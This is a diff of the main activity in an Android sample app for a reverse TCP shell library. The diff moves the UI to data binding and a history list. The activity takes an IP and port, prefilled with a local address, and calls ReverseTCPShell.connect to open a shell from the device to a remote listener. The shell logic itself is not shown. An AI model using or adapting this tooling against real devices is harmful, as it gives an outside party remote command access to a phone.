@@ -1,5 +1,7 @@
 package com.evil.reversetcpshellandroid.sample;
 
+import android.databinding.DataBindingUtil;
+import android.databinding.ViewDataBinding;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.view.View;
@@ -13,41 +15,41 @@ import android.widget.TextView;
 import com.evil.reversetcpshellandroid.library.ConnectErrorListener;
 import com.evil.reversetcpshellandroid.library.ConnectListener;
 import com.evil.reversetcpshellandroid.library.ReverseTCPShell;
+import com.evil.reversetcpshellandroid.sample.databinding.ActivityMainBinding;
 
 import java.util.ArrayList;
 import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
-    private TextView textView;
-    private EditText ipEditText, portEditText;
-    private ListView listView;
-    List<String> logList = new ArrayList<>();
     private MyAdapter myAdapter;
     private ReverseTCPShell mShell;
-    private Button button;
+    private ActivityMainBinding binding;
+    private History history;
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        textView = (TextView) findViewById(R.id.text_view);
-        listView = (ListView) findViewById(R.id.list_view);
-        button = (Button) findViewById(R.id.button);
-        ipEditText = (EditText) findViewById(R.id.ip_edit);
-        portEditText = (EditText) findViewById(R.id.port_edit);
+
+
+        binding = DataBindingUtil.setContentView(this, R.layout.activity_main);
+        history = new History();
+        binding.setHistory(history);
+
+
         myAdapter = new MyAdapter();
-        listView.setAdapter(myAdapter);
+        binding.listView.setAdapter(myAdapter);
 
         //图方便
-        ipEditText.setText("192.168.1.135");
-        portEditText.setText("3333");
+        binding.ipEdit.setText("192.168.1.135");
+        binding.portEdit.setText("3333");
 
         init();
     }
 
     private void init() {
         reset();
-        button.setOnClickListener(new View.OnClickListener() {
+        binding.button.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 if (mShell == null) {
@@ -61,7 +63,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void reset() {
-        logList.clear();
+        history.historyList.clear();
         if (mShell != null)
             mShell.stop();
         mShell = null;
@@ -69,29 +71,29 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void resetView() {
-        ipEditText.setEnabled(true);
-        portEditText.setEnabled(true);
-        button.setText("开始连接");
-        button.setEnabled(true);
+        binding.ipEdit.setEnabled(true);
+        binding.portEdit.setEnabled(true);
+        binding.button.setText("开始连接");
+        binding.button.setEnabled(true);
     }
 
     private void connect() {
-        ipEditText.setEnabled(false);
-        portEditText.setEnabled(false);
-        textView.setText("连接中...");
-        button.setText("断开连接");
-        button.setEnabled(false);
+        binding.ipEdit.setEnabled(false);
+        binding.portEdit.setEnabled(false);
+        addText("连接中...");
+        binding.button.setText("断开连接");
+        binding.button.setEnabled(false);
         doConnect();
     }
 
     private void doConnect() {
-        String ip = ipEditText.getText().toString().trim();
-        int port = Integer.valueOf(portEditText.getText().toString().trim());
+        String ip = binding.ipEdit.getText().toString().trim();
+        int port = Integer.valueOf(binding.portEdit.getText().toString().trim());
         ReverseTCPShell.connect(ip, port, new ConnectListener() {
             @Override
             public void connected(ReverseTCPShell shell) {
                 mShell = shell;
-                button.setEnabled(true);
+                binding.button.setEnabled(true);
                 addText("成功连接");
             }
 
@@ -124,7 +126,7 @@ public class MainActivity extends AppCompatActivity {
     public class MyAdapter extends BaseAdapter {
         @Override
         public int getCount() {
-            return logList.size() >= 1 ? logList.size() - 1 : 0;
+            return history.historyList.size() >= 1 ? history.historyList.size() - 1 : 0;
         }
 
         @Override
@@ -141,14 +143,13 @@ public class MainActivity extends AppCompatActivity {
         public View getView(int position, View convertView, ViewGroup parent) {
             TextView textView = new TextView(parent.getContext());
             textView.setTextSize(20f);
-            textView.setText(logList.get(position + 1));
+            textView.setText(history.historyList.get(position + 1));
             return textView;
         }
     }
 
     private void addText(String msg) {
-        textView.setText(msg);
-        logList.add(0, msg);
+        history.historyList.add(0, msg);
         myAdapter.notifyDataSetChanged();
     }
 
